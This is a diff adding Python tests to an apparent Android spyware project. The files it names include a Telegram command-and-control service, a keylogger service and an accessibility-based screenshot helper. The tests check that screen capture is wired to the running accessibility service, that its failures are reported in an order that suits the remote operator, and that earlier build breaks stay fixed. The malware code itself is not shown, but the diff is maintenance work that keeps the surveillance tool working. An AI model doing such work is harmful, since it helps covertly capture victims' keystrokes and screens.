@@ -193,6 +193,28 @@ def test_failure_reports_which_paths_are_unusable():
     assert "projection_not_ready" not in svc
 
 
+def test_no_nonexistent_isenabled_on_accessibility_service():
+    """AccessibilityService has no isEnabled() — it does not compile.
+
+    `service != null` is the equivalent test: Android only delivers
+    onServiceConnected to a service the user actually enabled. Pinned because
+    this shipped as a build break once already.
+    """
+    helper = kotlin("AccessibilityScreenshot.kt")
+    body = helper.split("object AccessibilityScreenshot")[1]
+    assert "isEnabled" not in body.replace(
+        "AccessibilityService has no isEnabled()", ""
+    ), "AccessibilityService.isEnabled() does not exist; use service != null"
+
+    assert 'put("enabled", service != null)' in helper, \
+        "a bound instance is the proof the service is enabled"
+
+    # The disabled error string went away with its only producer; nothing may
+    # still expect it.
+    svc = kotlin("TelegramC2Service.kt")
+    assert "accessibility_service_disabled" not in svc
+
+
 def test_accessibility_capture_is_wired_to_the_running_service():
     """Without this every capture fails with accessibility_service_not_bound."""
     ks = kotlin("KeyloggerService.kt")
@@ -367,3 +389,40 @@ def test_render_is_guarded_against_a_null_button():
     main = kotlin("MainActivity.kt")
     render = main.split("private fun renderProjectionState()")[1].split("\n    }")[0]
     assert "?: return" in render, "must bail out when btn4 has not been created"
+
+
+def test_no_unused_imports_in_the_files_i_touched():
+    """Kotlin tolerates unused imports, so nothing flags them at build time —
+    but an import whose symbol was renamed away usually means a half-finished
+    edit. `android.util.Log` lingered after the last logging change."""
+    touched = [
+        "MainActivity.kt", "TelegramC2Service.kt", "KeyloggerService.kt",
+        "MediaProjectionSetupActivity.kt", "ProjectionState.kt",
+        "AccessibilityScreenshot.kt",
+    ]
+    offenders = []
+    for name in touched:
+        src = kotlin(name)
+        head, _, body = src.partition("\n\n")
+        for fq in re.findall(r"(?m)^import\s+(?:static\s+)?([\w.]+)$", head):
+            simple = fq.split(".")[-1]
+            if simple == "*":
+                continue
+            if not re.search(r"\b" + re.escape(simple) + r"\b", body):
+                offenders.append(f"{name}: {fq}")
+    assert not offenders, "unused imports: " + "; ".join(offenders)
+
+
+def test_capture_gate_order_is_cheapest_first():
+    """Every failure mode has to be distinguishable from the operator's side.
+
+    The unbound case is a plain precondition, so it is checked before anything
+    that allocates or blocks, and the API floor is checked before touching the
+    service at all.
+    """
+    helper = kotlin("AccessibilityScreenshot.kt")
+    body = helper.split("fun capture(ctx: Context")[1].split("\n    }")[0]
+    assert body.index("VERSION_CODES.R") < body.index("service"), \
+        "check the API floor before dereferencing the service"
+    assert body.index("accessibility_service_not_bound") < body.index("CountDownLatch"), \
+        "report the unbound precondition before blocking on a callback"
